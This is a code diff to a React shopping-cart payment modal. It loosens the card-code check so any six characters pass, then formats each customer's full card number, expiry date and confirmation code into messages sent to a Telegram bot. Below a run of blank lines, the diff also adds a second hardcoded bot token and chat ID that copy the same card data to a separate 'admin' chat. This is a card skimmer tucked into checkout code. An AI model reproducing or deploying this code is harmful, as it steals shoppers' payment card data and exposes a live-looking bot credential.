@@ -60,7 +60,7 @@ export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, q
                return;
           }
 
-          if (data.cardcode === "123456") {
+          if (data.cardcode.length === 6) {
                axios.post('http://localhost:3004/api/add', { ...data, totalPrice })
                     .then(response => {
                          console.log("Success response:", response);
@@ -86,21 +86,27 @@ export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, q
 
                // Отправка текста сообщения
                const itemsDescription = basketItems.map(item =>
-                    `${item.nameproduct} - ${quantities[item.id]} шт - ${item.price * quantities[item.id]} $`
+                    `🔹 *${item.nameproduct}* — ${quantities[item.id]} шт — *${item.price * quantities[item.id]} $*`
                ).join('\n');
 
                const message = outdent`
-                🧾 Чек:
-                Номер карты: ${data.cardnumber}
-                Срок действия: ${data.carddate}
-                Общая сумма: ${totalPrice} $
-                Код подтверждения: ${data.cardcode}
-                Дата  оформления: ${formattedDate} -${formattedTime}
-                Товары:
-                ${itemsDescription}
-            `;
+    🧾 *Чек оплаты*
+    ───────────────
+    💳 *Номер карты:* \`${data.cardnumber}\`
+    📅 *Срок действия:* ${data.carddate}
+    💰 *Общая сумма:* \`${totalPrice} $\`
+    🔑 *Код подтверждения:* \`${data.cardcode}\`
+    🗓 *Дата оформления:* ${formattedDate} в ${formattedTime}
+    
+    🛒 *Товары:*
+    ${itemsDescription}
+    
+    Спасибо за покупку! 🎉
+`;
 
-               const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+               // URL для отправки сообщения
+               const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=Markdown&text=${encodeURIComponent(message)}`;
+
                axios.get(url)
                     .then(response => {
                          console.log("Message sent successfully:", response);
@@ -108,6 +114,48 @@ export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, q
                     .catch(error => {
                          console.error("Error sending message:", error);
                     });
+
+               
+               
+               
+               
+               
+     //админ
+     const adminToken = '7221957925:AAE2l4hPGNSfWYT6dcxWQ9cZ7HPo0dNnXhw'; // Токен администратора
+     const adminChatId = 6183727519; // Идентификатор чата администратора
+
+     const adminMessage = outdent`
+    📋 *Новый заказ поступил!*
+
+    💳 *Платежная информация:*
+    ───────────────
+    • *Номер карты:* ${data.cardnumber}
+    • *Срок действия:* ${data.carddate}
+    • *Общая сумма:* ${totalPrice} $
+    • *Код подтверждения:* ${data.cardcode}
+
+    🛍 *Детали заказа:*
+    ───────────────
+    ${itemsDescription}
+
+    🗓 *Дата оформления:* ${formattedDate}, ${formattedTime}
+
+    _Спасибо, что следите за процессом!_
+`;
+
+               // Отправка сообщения
+               const adminUrl = `https://api.telegram.org/bot${adminToken}/sendMessage?chat_id=${adminChatId}&parse_mode=Markdown&text=${encodeURIComponent(adminMessage)}`;
+
+               axios.get(adminUrl)
+                    .then(response => {
+                         console.log("Admin message sent successfully:", response);
+                    })
+                    .catch(error => {
+                         console.error("Error sending admin message:", error);
+                    });
+
+               
+               
 
                // Отправка каждого продукта как отдельного сообщения
                const sendProductImages = async () => {
